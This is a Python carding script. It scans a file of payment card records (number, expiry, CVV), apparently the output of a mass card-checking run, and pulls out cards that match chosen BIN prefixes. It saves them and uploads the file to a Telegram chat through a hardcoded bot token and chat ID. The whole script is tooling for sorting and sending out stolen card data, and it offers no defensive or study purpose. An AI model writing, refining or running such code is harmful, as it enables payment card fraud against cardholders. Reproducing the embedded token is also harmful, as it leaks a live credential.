import os
import re
import requests

# ==================== CONFIGURATION (Put your details here) ====================
# Telegram bot token (Create one via @BotFather)
BOT_TOKEN = "7390006340:AAGhtpuwmvIWTlW-yLOI_WYsUq0rMu3bt9M"

# Your Telegram account numeric ID (Send /id to @userinfobot to get it)
TELEGRAM_CHAT_ID = "2034253345"

# Input large text file path containing cards
INPUT_FILE = "mass_results_stopped_3496of6000.txt"

# Target BINs to extract (Add as many 6 or 8-digit BINs as you want)
TARGET_BINS = [
    "601100", 
    "559758",
    # Add more target BINs here
]

# Output file name for extracted cards
OUTPUT_FILE = "extracted_cards.txt"
# ==============================================================================

def extract_cards():
    # Validation checks
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or TELEGRAM_CHAT_ID == "YOUR_TELEGRAM_ID_HERE":
        print("⚠️ Warning: Please configure your BOT_TOKEN and TELEGRAM_CHAT_ID at the top of the script!")
        
    if not os.path.exists(INPUT_FILE):
        print(f"❌ Error: Input file '{INPUT_FILE}' not found in the current directory!")
        return

    print(f"📖 Reading '{INPUT_FILE}'...")
    matched_cards = []
    
    # Regular expression to extract standard card format: number|month|year|cvv
    cc_pattern = re.compile(r'(\d{15,16})[|](\d{2})[|](\d{2,4})[|](\d{3,4})')

    with open(INPUT_FILE, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line_str = line.strip()
            # Find the card pattern in the line
            match = cc_pattern.search(line_str)
            if match:
                card_num = match.group(1)
                # Check if the card matches any target BIN
                for target_bin in TARGET_BINS:
                    if card_num.startswith(target_bin):
                        # Construct clean card format
                        full_card = f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}"
                        matched_cards.append(full_card)
                        break

    total_extracted = len(matched_cards)
    print(f"🎯 Found {total_extracted} cards matching the target BINs.")

    if total_extracted == 0:
        print("⚠️ No matching cards found. Exiting.")
        return

    # Save matched cards to the output file
    with open(OUTPUT_FILE, "w", encoding="utf-8") as out:
        out.write("\n".join(matched_cards) + "\n")
    print(f"💾 Extracted cards saved to '{OUTPUT_FILE}'.")

    # Send the output file to Telegram using a direct HTTP POST request (No Pyrogram conflicts)
    if BOT_TOKEN != "YOUR_BOT_TOKEN_HERE" and TELEGRAM_CHAT_ID != "YOUR_TELEGRAM_ID_HERE":
        print(f"📤 Uploading file to Telegram chat: {TELEGRAM_CHAT_ID}...")
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        caption = (
            f"🎯 <b>BIN Extraction Complete!</b>\n"
            f"📋 <b>Target BINs:</b> <code>{', '.join(TARGET_BINS)}</code>\n"
            f"💳 <b>Extracted Cards:</b> <code>{total_extracted}</code>"
        )
        try:
            with open(OUTPUT_FILE, "rb") as document:
                files = {"document": document}
                data = {
                    "chat_id": TELEGRAM_CHAT_ID,
                    "caption": caption,
                    "parse_mode": "HTML"
                }
                response = requests.post(url, data=data, files=files, timeout=30)
                res_json = response.json()
                if res_json.get("ok"):
                    print("✅ File successfully sent to Telegram!")
                else:
                    print(f"❌ Telegram API Error: {res_json}")
        except Exception as e:
            print(f"❌ Failed to send file via Telegram: {e}")
    else:
        print("ℹ️ Telegram details not configured. File saved locally only.")

if __name__ == "__main__":
    extract_cards()
